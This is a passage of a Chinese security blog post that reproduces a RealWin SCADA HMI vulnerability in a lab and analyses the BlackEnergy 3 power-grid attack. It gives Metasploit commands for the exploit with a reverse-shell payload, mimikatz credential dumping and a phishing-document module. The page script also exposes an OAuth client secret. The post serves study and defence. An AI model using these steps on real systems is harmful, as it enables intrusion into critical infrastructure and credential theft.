src="https://img-blog.csdnimg.cn/c85f506f2ba74709806aff5d51ac8b05.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_11,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>PS</strong>：后续步骤省略，都是默认操作就好</p>
+<ul>
+<li>最后这里说一下密码是怎么知道的吧<ul>
+<li>IDA 定位输入密码的位置，尝试修改跳转语句绕过密码校验环节</li>
+<li>通过PEiD 知道是Wise 安装包，通过Wise Unpacker GUI 工具获取密码</li>
+</ul>
+</li>
+</ul>
+<p>此处通过安装包信息发现是7z 压缩包，尝试解压出来看看</p>
+<p><img src="https://img-blog.csdnimg.cn/7a817ac935de4ea9b0f161171c97ab3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>7z制作的自解压文件，用7z 命令解压出来</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">7</span><span class="hljs-keyword">z</span> <span class="hljs-keyword">e</span> <span class="hljs-keyword">exe</span>名字<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/e521b8c44e234699a644ed23ebe9b34a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>PEiD查一下 RwSetupD 这个文件，提示是Wise安装包。运行这个包，最后会提醒我输入密码</p>
+<p><img src="https://img-blog.csdnimg.cn/b26a2ff8266d4228ade209aff1d3219b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>利用Wise Unpacker GUI 工具获取密码，执行结束后发现密码</p>
+<p><img src="https://img-blog.csdnimg.cn/a99ceaa3cf6249b1a97213de53b808c0.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/512bad70722c41ad9dba235e3734bad2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<ul>
+<li>安装 RealWin 服务器后，单击桌面图标，如下所示：</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/40cd168119714e21b888f0aa7b2ea062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>此 HMI 软件设计用于电信、电力、石油&#x2F;天然气、船舶和水行业。如果我们点击电力模块，默认是打开纽约市地区的设施地图（也可以针对任何地区进行定制）</p>
+<p><img src="https://img-blog.csdnimg.cn/3e04d16f4b7443ce9f5e5672cff4555d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/288d5be5ca2a4151a06e05050ee13c22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="0x04-MSF-攻击-HMI"><a href="#0x04-MSF-攻击-HMI" class="headerlink" title="0x04 MSF 攻击 HMI"></a>0x04 MSF 攻击 HMI</h1><ul>
+<li>Metasploit 有大量的 SCADA&#x2F;ICS 模块</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">msfconsole<br># 搜索 realwin HMI 模块<br>search realwin<br><br># 有多个模块名称中包含 Realwin。这里我们选择使用realwin_scpc_initialize模块，通过输入将其加载到内存中<br>use exploit/windows/scada/realwin_scpc_initialize<br><br># 了解有关此模块的更多信息<br>info<br></code></pre></td></tr></table></figure>
+
+<p>该模块默认利用端口 912 并发送“特制数据包”以在系统上执行任意代码。有效负载自动设置为“ windows&#x2F;meterpreter&#x2F;reverse_tcp”。让我们保持默认有效负载不变</p>
+<ul>
+<li>此个漏洞利用中，需要设置 RHOSTS（远程主机）和 LHOST（本地主机）选项</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">show options<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>配置 HMI 系统（RHOSTS）IP和 Kali 系统（LHOST）IP 地址来设置这些变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">set</span> RHOSTS  x.x.x.x<br><span class="hljs-built_in">set</span> LHOST   x.x.x.x<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>攻击HMI</p>
+</li>
+</ul>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">exploit</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>攻击成功后，可以获取执行命令、获取系统敏感信息等操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo <br><span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">dir</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>mimikatz来查找系统中的明文密码</p>
+</li>
+</ul>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute"> load mimikatz</span><br><span class="hljs-attribute">kerberos</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="0x05-SCADA-恶意软件剖析，BlackEnergy-3-对xxx电x的攻击"><a href="#0x05-SCADA-恶意软件剖析，BlackEnergy-3-对xxx电x的攻击" class="headerlink" title="0x05 SCADA 恶意软件剖析，BlackEnergy 3 对xxx电x的攻击"></a>0x05 SCADA 恶意软件剖析，BlackEnergy 3 对xxx电x的攻击</h1><p> SCADA 黑客在2014年对xxxx电力系统的攻击，是使用了一种被称为BlackEnergy 3的恶意软件的结果</p>
+<p>Blackenergy 是一种特洛伊木马，现已在全球范围内盘旋十多年，并在此期间进行了一些重大转变。它最初旨在为僵尸网络生成僵尸以用于 DDoS 和分布式密码攻击（BlackEnergy 1），它的模块化特性使其能够转变为 SCADA&#x2F;ICS 恶意软件（BlackEnergy 3）</p>
+<ul>
+<li>2014年12月23日晚，xxx兰西部城市伊万诺-弗兰科夫斯克市停电</li>
+</ul>
+<p>大约在同一时间，第二家xxx兰电力公司 Kyivblenergo 宣布遭到黑客攻击，黑客断开了 30 个变电站的断路器，导致 80,000 名客户断电，总共有超过 225,000 人断电。</p>
+<p>当初的攻击背景是在克里米亚公投并加入俄xx之后，因xxx兰与俄xx矛盾加剧，在网络攻击发生前一个月左右，xxx兰将克里米亚地区进行了断电</p>
+<p>本次xxx兰断电事件中，攻击者首先通过“主题为xxx兰x统对部分动员令”钓鱼邮件进行投递，在受害者点击并启用载有BlackEnergy的恶意宏文档后， BlackEnergy在获取了相关凭证后，便开始进行网络资产探测，横向移动，并最终获得了SCADA系统的控制能力。</p>
+<p>从而可以通过该系统，进行断路器操纵，并在攻击发生前，先使用KillDisk擦除入侵痕迹覆盖MBR和部分扇区的方式进行数据破坏，使得系统不能正常自启，阻止断电后的迅速恢复，此外据资料显示，Sandworm在发生攻击时还曾对客服中心发起dos攻击，阻止电力公司提前得知断电消息。</p>
+<h2 id="5-1-什么是BlackEnergy？"><a href="#5-1-什么是BlackEnergy？" class="headerlink" title="5.1 什么是BlackEnergy？"></a>5.1 什么是BlackEnergy？</h2><p>BlackEnergy 最初是为 DDoS 攻击而开发的，在过去十年中经历了三 (3) 次转型</p>
+<p><strong>注意</strong>：在xxx兰袭击中使用的是 BlackEnergy 3</p>
+<p>BlackEnergy 2 出现在 2010 年，随着它的新出现，它拥有一个新的插件架构，使开发人员能够轻松地添加功能。2014 年使用 BlackEnergy 3 时，它的新功能远远超出了原始 BlackEnergy 1 DDoS 工具的功能。这些新功能包括数据泄露和网络监控插件。这些新插件非常复杂，以至于它们很可能是一个国家发展努力的成果</p>
+<p><img src="https://img-blog.csdnimg.cn/3fd5fad0d2eb49bca4f7096bb51b3c1d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>当时 BlackEnergy 3 出现在xxx兰，它在 OLE packager 2 (packager.dll) 中使用了针对 Microsoft Office 2013 的漏洞 CVE-2014-4114，微软将同样的漏洞列举为 MS14-060，在 Microsoft 的 Technet Bulletin 中，该漏洞描述为：</p>
+<blockquote>
+此安全更新解决了 Microsoft Windows 中一个秘密报告的漏洞。如果用户打开包含特制 OLE 对象的 Microsoft Office 文件，该漏洞可能允许远程执行代码。成功利用此漏洞的攻击者可以在当前用户的上下文中运行任意代码。如果当前用户使用管理用户权限登录，则攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新帐户。与使用管理用户权限操作的用户相比，其帐户被配置为在系统上拥有较少用户权限的客户受到的影响可能更小
+</blockquote>
+ 
+
+<p>MSF 中提供了针对此漏洞的漏洞利用：</p>
+<p>从前面的概述介绍中，我们已经知道黑客是发送了钓鱼邮件，这里以MSF为例制作 Office 恶意宏文档，名称主题为“xxx兰x统对部分动员令”钓鱼邮件进行投递，通常可能是 Excel 或 Word 文档，发给必须信任发件人的受害者，并单击以允许宏运行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>fileformat/ms14_060_sandworm<br></code></pre></td></tr></table></figure>
+
+<p>xxx兰用户收到类似于以下的消息</p>
+<p><img src="https://img-blog.csdnimg.cn/1f82c5601a9a45d29968cc5ccdb848c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>此漏洞利用的工作原理：Microsoft Office 支持执行宏（感谢 OLE 格式），允许文档制作者可以轻松嵌入宏和 Visual Basic 代码，然后任何打开文档的人的电脑都会执行这些代码</p>
+<p>许多年前，恶意行为攻击者们就已经开始滥用Microsoft Office 支持执行宏的功能，并开始更频繁地引入此向量的攻击方式，因为这种攻击方式攻击来的又快又轻松。随后，微软添加了保护功能，例如默认禁用宏和任何外部内容的功能，并在即将执行宏等内容时警告用户</p>
+<p>下面的屏幕截图为 BlackEnergy 3 中的 Visual Basic 代码显示为宏</p>
+<p><img src="https://img-blog.csdnimg.cn/db65caef400945b5bfa6da674f8d30ef.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="5-2-SandWorm-团队攻击路线"><a href="#5-2-SandWorm-团队攻击路线" class="headerlink" title="5.2 SandWorm 团队攻击路线"></a>5.2 SandWorm 团队攻击路线</h2><h3 id="5-2-1-第一阶段"><a href="#5-2-1-第一阶段" class="headerlink" title="5.2.1 第一阶段"></a>5.2.1 第一阶段</h3><p>攻击的第一阶段是带有附加 Office 文件的鱼叉式网络钓鱼，这些电子邮件似乎来自xx兰x府的官x。当用户打开附件并启用宏内容时，恶意软件立即连接到攻击者（Sandworm）的命令和控制（C&amp;C）服务器。然后，攻击者就可以开始收集有关系统和网络的信息，包括本地化和键盘布局</p>
+<p>随后使用mimikatz收集了其他系统和 VPN 的凭据，并提升权限，然后在整个内网中横向移动</p>
+<p><img src="https://img-blog.csdnimg.cn/e672db6cc00d4f999b6b20684dc44743.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>通过窃取的凭据，Sandworm 攻击者能够在整个网络中畅通无阻。通过这种访问，能够映射整个网络，并且使用 VPN 凭据能够继续访问内外且不容易被发现</p>
+<h3 id="5-2-2-第二阶段"><a href="#5-2-2-第二阶段" class="headerlink" title="5.2.2 第二阶段"></a>5.2.2 第二阶段</h3><p>在第二阶段，攻击者可能会劫持 HMI（人机界面）以访问 SCADA&#x2F;ICS 网络。一旦进入 SCADA 网络，攻击者就可以拦截 tcp-to-serial 通信并对 UPS 的固件进行逆向工程</p>
+<h3 id="5-2-3-第三阶段"><a href="#5-2-3-第三阶段" class="headerlink" title="5.2.3 第三阶段"></a>5.2.3 第三阶段</h3><p>在第三阶段，攻击者上传了新的 UPS 固件和 KillDisk 程序，该程序清除了关键系统的系统文件和 MBR（主引导记录），使它们无法恢复，然后攻击者断开了 30 个变电站断路器（显然只是使用 HMI就达到了这个效果）</p>
+<p>下图显示了在 IDA 中对 KillDisk API 导入的静态分析</p>
+<p><img src="https://img-blog.csdnimg.cn/c730c6e3e1214cb7a66b3aeae68b67cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h3 id="5-2-4-第四阶段"><a href="#5-2-4-第四阶段" class="headerlink" title="5.2.4 第四阶段"></a>5.2.4 第四阶段</h3><p>在最后阶段，攻击者对电力公司的求助热线进行了语音 DDoS 攻击，从而延迟了对停电的初步告警和响应措施的实施</p>
+<h2 id="5-3-SCADA-恶意软件剖析，BlackEnergy-3-对x电xx的攻击总结"><a href="#5-3-SCADA-恶意软件剖析，BlackEnergy-3-对x电xx的攻击总结" class="headerlink" title="5.3 SCADA 恶意软件剖析，BlackEnergy 3 对x电xx的攻击总结"></a>5.3 SCADA 恶意软件剖析，BlackEnergy 3 对x电xx的攻击总结</h2><p>BlackEnergy 3 恶意软件标志着历史上攻击者首次将停电用作网络战的一种形式。在这次攻击中要重点吸取的教训是，该恶意软件并非旨在利用 SCADA 网络或系统中的漏洞，而是连接到 SCADA 网络的公司网络（许多 SCADA 攻击的典型）</p>
+<p>该次攻击中，可以发现强调了需要将 SCADA 网络与业务网络隔离和隔离，要不然一旦攻击者利用了公司网络中的沦陷主机，攻击者就利用提升沦陷的主机的权限，来进行内网横向移动攻击其他系统，并最终控制可以访问 SCADA 网络的系统，例如 HMI，从而达到禁用变电站断路器并导致停电的目的</p>
+<p><strong>参考链接</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackers-arise.com/post/2018/10/10/scada-hacking-anatomy-of-a-scada-malware-blackenergy-3">https://www.hackers-arise.com/post/2018/10/10/scada-hacking-anatomy-of-a-scada-malware-blackenergy-3</a></p>
+<hr>
+<p><strong>你以为你有很多路可以选择，其实你只有一条路可以走</strong></p>
+<hr>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ATTACK/">#ATTACK</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RealWin Server HMI 漏洞复现与恶意攻击链分析</div>
+      <div>https://orangey.info/2022/09/24/123407669/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>橙留香</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年9月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/09/24/124153866/" title="「干货」XCTF Web安全入门练习靶场全部通关教程">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">「干货」XCTF Web安全入门练习靶场全部通关教程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/24/122803801/" title="Windows下手把手教Snort的安装与配置教程">
+                        <span class="hidden-mobile">Windows下手把手教Snort的安装与配置教程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.7.2/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"1e96aec5ac46370916fa","clientSecret":"ee5e97a65cf34e9fe31e15ab0421a94968237f5e","repo":"ogGitalk","owner":"ananasOrangey","admin":["ananasOrangey"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'b2397e7886baf2672b7a114f92909b5a'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://orangey.blog.csdn.net" target="_blank" rel="nofollow noopener"><span>橙留香CSDN博客</span></a> <i class="iconfont icon-love"></i> <a href="https://i.imgtg.com/2022/09/21/gNXxK.png" target="_blank" rel="nofollow noopener"><span>橙留香微信公众号</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
